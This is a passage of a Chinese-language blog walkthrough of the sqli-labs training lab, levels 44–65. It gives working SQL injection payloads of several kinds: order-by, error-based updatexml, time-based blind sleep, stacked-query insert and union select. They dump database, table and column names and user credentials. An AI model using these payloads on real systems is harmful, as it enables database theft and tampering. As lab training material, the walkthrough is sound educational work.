+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### less-44</span><br><span class="line"></span><br><span class="line">同上，但是使用时间盲注</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### less-45</span><br><span class="line"></span><br><span class="line">闭合方式为`&#x27;)&#x27;`,同上</span><br><span class="line"></span><br><span class="line">### less-46</span><br><span class="line"></span><br><span class="line">#### order by注入</span><br><span class="line"></span><br><span class="line">测试</span><br><span class="line"></span><br><span class="line">`?sort=1`</span><br><span class="line"></span><br><span class="line">首先了解order by参数注入：</span><br><span class="line"></span><br><span class="line">order by 注入是指其后面的参数是可控的</span><br><span class="line"></span><br><span class="line">order by 不同于我们在 where 后的注入点，不能使用 union 等注入，其后可以跟接 报错注入 或者 时间盲注</span><br><span class="line"></span><br><span class="line">爆破数据库</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?sort=-1 and updatexml(1,concat(0x7e,database(),0x7e),1)
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">爆破数据表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?sort=-1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),0x7e),1)
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">爆破数据列</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?sort=-1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),0x7e),1)
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">爆破用户名密码回显有限</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?sort=-1 and updatexml(1,concat(0x7e,(select concat_ws(username,&#39;:&#39;,password) from users limit 0,1),0x7e),1)
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### less-47</span><br><span class="line"></span><br><span class="line">闭合方式为`&#x27;`,同上</span><br><span class="line"></span><br><span class="line">爆破数据库</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?sort=-1 and updatexml(1,concat(0x7e,database(),0x7e),1)
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">爆破数据表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?sort=-1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),0x7e),1)
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">爆破数据列</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?sort=-1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),0x7e),1)
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">爆破用户名密码回显有限</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?sort=-1 and updatexml(1,concat(0x7e,(select concat_ws(username,&#39;:&#39;,password) from users limit 0,1),0x7e),1)
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### less-48</span><br><span class="line"></span><br><span class="line">没有回显，故使用时间延时注入</span><br><span class="line"></span><br><span class="line">猜解 数据库</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?sort=-1 and if((ascii(substr(database(),1,1))=115),sleep(10),1) --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">猜解数据表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?sort=-1 and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1);--+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">猜解数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?sort=-1 and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1);--+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### less-49</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">闭合方式为`&#x27;`，同上</span><br><span class="line"></span><br><span class="line">### less-50</span><br><span class="line"></span><br><span class="line">堆叠注入与order by 注入</span><br><span class="line"></span><br><span class="line">查询加添加</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?sort=1;insert into users(id,username,password)values(100,&#39;721721&#39;,&#39;127&#39;); --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### less-51</span><br><span class="line"></span><br><span class="line">闭合方式为`&#x27;`闭合，同上</span><br><span class="line"></span><br><span class="line">### less-52</span><br><span class="line"></span><br><span class="line">order by注入加时间盲注</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?sort=1;insert into users(id,username,password)values(100,&#39;721&#39;,&#39;721&#39;); --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### less-53</span><br><span class="line"></span><br><span class="line">闭合方式为`&#x27;`同上</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### less-54</span><br><span class="line"></span><br><span class="line">仅允许我们输入十次语句，十次语句时候该靶场就会对里面所有的库名，表名，列名进行一个刷新。</span><br><span class="line"></span><br><span class="line">爆破数据库</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1&#39; union select 1,2,database() --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">爆破数据表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39; --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">爆破1ezqs7v0qo的列</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;1ezqs7v0qo&#39; --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">查询secret_RMW1：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1&#39; union select 1,group_concat(secret_RMW1),3 from 1ezqs7v0qo --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### less-55</span><br><span class="line"></span><br><span class="line">闭合方式为`)`,同上</span><br><span class="line"></span><br><span class="line">### less-56</span><br><span class="line"></span><br><span class="line">闭合方式为`&#x27;)`,同上</span><br><span class="line"></span><br><span class="line">### less-57</span><br><span class="line"></span><br><span class="line">闭合方式为`&quot;`,同上</span><br><span class="line"></span><br><span class="line">### less-58</span><br><span class="line"></span><br><span class="line">这关无法使用union select，并且只有5次机会</span><br><span class="line"></span><br><span class="line">使用报错注入</span><br><span class="line"></span><br><span class="line">爆破数据库</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">爆破数据表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;challenges&#39;),0x7e),1) --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">爆破6ykqspiws7列</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;6ykqspiws7&#39; limit 2,1),0x7e),1) --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=-1&#39; and updatexml(1,concat(0x7e,(select secret_K2GB from 6ykqspiws7),0x7e),1) --+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### less-59</span><br><span class="line"></span><br><span class="line">闭合方式为整形</span><br><span class="line"></span><br><span class="line">同上</span><br><span class="line"></span><br><span class="line">### less-60</span><br><span class="line"></span><br><span class="line">闭合方式为`&quot;)`</span><br><span class="line"></span><br><span class="line">同上</span><br><span class="line"></span><br><span class="line">### less-61</span><br><span class="line"></span><br><span class="line">闭合方式为`&#x27;))`</span><br><span class="line"></span><br><span class="line">同上</span><br><span class="line"></span><br><span class="line">### less-62</span><br><span class="line"></span><br><span class="line">联合查询无法使用无报错回显</span><br><span class="line"></span><br><span class="line">使用时间盲注</span><br><span class="line"></span><br><span class="line">闭合方式为`&#x27;)`</span><br><span class="line"></span><br><span class="line">#### **猜解数据库名**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=1&#39;) and if(ascii(substring(database(),1,1))=115,sleep(10),1)--+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">发现页面有明显延时，说明猜解正确</span><br><span class="line"></span><br><span class="line">依次猜解数据库其他字符</span><br><span class="line"></span><br><span class="line">#### **猜解表名**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=1&#39;) and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1)--+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 猜解字段</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=1&#39;) and if(ascii(substring((select column_name from informaton_schema.columns where column_schema=database() limit 0,1),1,1))=111,sleep(10),1);--+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### 猜内容</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+?id=1&#39;) if(ascii(substring((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1)--+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">同less-8</span><br><span class="line"></span><br><span class="line">### less-63</span><br><span class="line"></span><br><span class="line">闭合方式为`&#x27;`</span><br><span class="line"></span><br><span class="line">同上</span><br><span class="line"></span><br><span class="line">### less-64</span><br><span class="line"></span><br><span class="line">闭合方式为`))`同上</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### less-65</span><br><span class="line"></span><br><span class="line">闭合方式为`&quot;)`</span><br><span class="line"></span><br><span class="line">同上</span><br><span class="line"></span><br><span class="line"># sql-map的简单使用</span><br><span class="line"></span><br><span class="line">&gt; 在kail的虚拟机中直接就有sqlmap工具</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+一些sql-map注入的命令：
+</code></pre>
+</li>
+</ol>
+<pre><code>
+[(2条消息) Sqlmap命令大全_风过留不留声的博客-CSDN博客](https://blog.csdn.net/phpppppppppp/article/details/124968358)
+</code></pre>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/07/29/Java%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E4%B8%80/" rel="prev" title="Java安全入门(一)">
+      <i class="fa fa-chevron-left"></i> Java安全入门(一)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/07/29/buuctf-web/" rel="next" title="buuctf(web)">
+      buuctf(web) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql-lab%E5%85%A8%E9%80%9A%E5%85%B3"><span class="nav-number">1.</span> <span class="nav-text">sql-lab全通关</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">sql注入基本流程：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GET%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.2.</span> <span class="nav-text">GET类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#less-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">less-1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-2"><span class="nav-number">1.2.2.</span> <span class="nav-text">less-2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-3"><span class="nav-number">1.2.3.</span> <span class="nav-text">less-3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-4"><span class="nav-number">1.2.4.</span> <span class="nav-text">less-4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-5"><span class="nav-number">1.2.5.</span> <span class="nav-text">less-5</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%8B%E5%B7%A5%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">手工盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#burpsuite%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.2.5.2.</span> <span class="nav-text">burpsuite的自动化盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B5%8C%E5%A5%97%E6%9F%A5%E8%AF%A2"><span class="nav-number">1.2.5.3.</span> <span class="nav-text">嵌套查询</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#updatexml%E5%87%BD%E6%95%B0"><span class="nav-number">1.2.5.4.</span> <span class="nav-text">updatexml函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-6"><span class="nav-number">1.2.6.</span> <span class="nav-text">less-6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-7"><span class="nav-number">1.2.7.</span> <span class="nav-text">less-7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-8"><span class="nav-number">1.2.8.</span> <span class="nav-text">less-8</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="nav-number">1.2.8.1.</span> <span class="nav-text">原理：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-number">1.2.8.2.</span> <span class="nav-text">猜解数据库名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E8%A1%A8%E5%90%8D"><span class="nav-number">1.2.8.3.</span> <span class="nav-text">猜解表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5"><span class="nav-number">1.2.8.4.</span> <span class="nav-text">猜解字段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%9C%E5%86%85%E5%AE%B9"><span class="nav-number">1.2.8.5.</span> <span class="nav-text">猜内容</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-9"><span class="nav-number">1.2.9.</span> <span class="nav-text">less-9</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-10"><span class="nav-number">1.2.10.</span> <span class="nav-text">less-10</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POST%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.3.</span> <span class="nav-text">POST类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#less-11"><span class="nav-number">1.3.1.</span> <span class="nav-text">less-11</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">判断字段数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%98%BE%E7%A4%BA%E4%BD%8D"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">判断显示位</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">爆数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE%E8%A1%A8"><span class="nav-number">1.3.1.4.</span> <span class="nav-text">爆数据表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%88%86user%E8%A1%A8%E7%9A%84%E5%88%97"><span class="nav-number">1.3.1.5.</span> <span class="nav-text">爆user表的列</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%88%86%E7%A0%B4%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81"><span class="nav-number">1.3.1.6.</span> <span class="nav-text">爆破用户名和密码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-12"><span class="nav-number">1.3.2.</span> <span class="nav-text">less-12</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-13"><span class="nav-number">1.3.3.</span> <span class="nav-text">less-13</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-14"><span class="nav-number">1.3.4.</span> <span class="nav-text">less-14</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-15"><span class="nav-number">1.3.5.</span> <span class="nav-text">less-15</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-16"><span class="nav-number">1.3.6.</span> <span class="nav-text">less-16</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-17"><span class="nav-number">1.3.7.</span> <span class="nav-text">less-17</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-18"><span class="nav-number">1.3.8.</span> <span class="nav-text">less-18</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-19"><span class="nav-number">1.3.9.</span> <span class="nav-text">less-19</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-20"><span class="nav-number">1.3.10.</span> <span class="nav-text">less-20</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-21"><span class="nav-number">1.3.11.</span> <span class="nav-text">less-21</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-22"><span class="nav-number">1.3.12.</span> <span class="nav-text">less-22</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-23"><span class="nav-number">1.3.13.</span> <span class="nav-text">less-23</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#00%E6%88%AA%E6%96%AD"><span class="nav-number">1.3.14.</span> <span class="nav-text">%00截断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-24"><span class="nav-number">1.3.15.</span> <span class="nav-text">less-24</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-25"><span class="nav-number">1.3.16.</span> <span class="nav-text">less-25</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-25a"><span class="nav-number">1.3.17.</span> <span class="nav-text">less-25a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-26"><span class="nav-number">1.3.18.</span> <span class="nav-text">less-26</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-26a"><span class="nav-number">1.3.19.</span> <span class="nav-text">less-26a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-27"><span class="nav-number">1.3.20.</span> <span class="nav-text">less-27</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-27a"><span class="nav-number">1.3.21.</span> <span class="nav-text">less-27a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-28"><span class="nav-number">1.3.22.</span> <span class="nav-text">less-28</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-29"><span class="nav-number">1.3.23.</span> <span class="nav-text">less-29</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-30"><span class="nav-number">1.3.24.</span> <span class="nav-text">less-30</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-31"><span class="nav-number">1.3.25.</span> <span class="nav-text">less-31</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-32"><span class="nav-number">1.3.26.</span> <span class="nav-text">less-32</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-33"><span class="nav-number">1.3.27.</span> <span class="nav-text">less-33</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-34"><span class="nav-number">1.3.28.</span> <span class="nav-text">less-34</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-35"><span class="nav-number">1.3.29.</span> <span class="nav-text">less-35</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
